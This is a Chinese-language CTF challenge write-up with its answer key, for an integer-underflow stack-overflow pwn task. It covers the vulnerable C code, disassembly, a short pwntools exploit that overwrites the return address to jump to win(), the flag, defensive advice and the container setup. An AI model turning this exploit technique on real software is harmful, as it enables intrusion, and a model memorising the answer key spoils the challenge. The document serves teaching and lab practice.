# pwn-int-underflow

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 易 |
| 考点 | 有符号/无符号比较不一致；长度参数下溢成 `0xffffffff`；栈溢出 |
| 容器端口 | 宿主机 9105 → 容器 1337 |
| Flag | `flag{integer_underflow_bypasses_the_length_check}` |

## 题面（直接复制到平台「简介」）

一个"按长度收数据"的服务：先读 4 字节长度，再按这个长度读数据。用 `nc <地址> 9105` 连上去，会依次看到 `send length (4 bytes little endian):` 和 `send data:`。目标：让程序走到那条会打印 flag 的分支。

**提示**：`objdump -d` 里那条长度比较用的是有符号跳转还是无符号跳转？`read` 的第三个参数又是从哪个寄存器来的？

## 二、题目描述

```
nc <host> 9105
send length (4 bytes little endian):
send data:
```

```c
unsigned int len = 0;
read(0, &len, sizeof len);     /* 读 4 字节原始长度 */
if ((int)len > 64) { puts("too long"); return; }
read(0, buf, len);             /* buf 只有 64 字节 */
```

长度上限检查把 `unsigned` 强制转成 `int` 再比，之后又用原始的 `unsigned` 值当 `read` 的长度。

## 三、解题步骤

1. 看检查逻辑：

```bash
objdump -d files/pwn | sed -n '/<main>:/,/ret/p' | grep -A3 -B3 cmp
```

```asm
401217: mov    eax,DWORD PTR [rbp-0x44]   ; len
40121a: cmp    eax,0x40
40121d: jle    401235                     ; 有符号比较：-1 <= 64 成立
401244: mov    eax,DWORD PTR [rbp-0x44]   ; len
401247: mov    edx,eax                    ; read 的第三个参数
401249: lea    rax,[rbp-0x40]             ; buf
401255: call   401090 <read@plt>
```

`jle` 是有符号跳转。传 `0xffffffff`，解释成 `int` 就是 `-1`，`-1 <= 64` 成立，检查被绕过；
但 `read` 拿到的是 `0xffffffff` 字节的额度。

2. 构造输入：先发 4 字节长度，再发数据。缓冲区 `buf` 在 `rbp-0x40`，返回地址在 `rbp+8`，
   偏移 `0x40 + 8 = 72`。

```python
p.recvuntil(b'endian):')
p.send(p32(0xffffffff))
time.sleep(0.2)
p.send(b'A' * 72 + p64(0x401196))    # win()
```

`read` 的字节数上限是 `0xffffffff`，但 socket 上读到多少返回多少，发完就会立即返回，
不会真的等 4GB 数据。

3. 跑 exp：

```bash
python3 exp/exp.py
```

输出：

```
send data:
done
flag{...}
```

## 四、原理

C 里 `(int)len` 是有符号转换，`0xffffffff` 变成 `-1`。比较用有符号、使用用无符号，
是同一变量两套语义的经典错配。

`read` 的第三个参数类型是 `size_t`（无符号 64 位）。实参 `len` 是 `unsigned int`，
传参时零扩展成 `0x00000000ffffffff`，于是"长度上限"变成 4GB。

利用上和普通栈溢出没有区别：覆盖 `[rbp+8]` 的返回地址，跳到 `win()`。

`win` 带 `__attribute__((force_align_arg_pointer))`，用 `ret` 进入时自行重对齐栈，
`system` 不会因为 `movaps` 崩溃。

## 五、防御建议

- 长度变量统一用 `size_t`，检查和使用的类型保持一致，不要中途强转。
- 检查写成 `if (len > sizeof buf) reject;`，并在 `read` 里再用 `MIN(len, sizeof buf)` 兜一层。
- 编译期打开 `-Wsign-compare -Wconversion`，这类隐式转换会有告警。
- `-D_FORTIFY_SOURCE=2` 下 `read(0, buf, 变量)` 会被 `__read_chk` 包裹，超大长度直接 abort。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键地址：`win = 0x401196`，`main = 0x4011b4`，`buf = rbp-0x40`，返回地址偏移 72。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-int-underflow` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-int-underflow` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
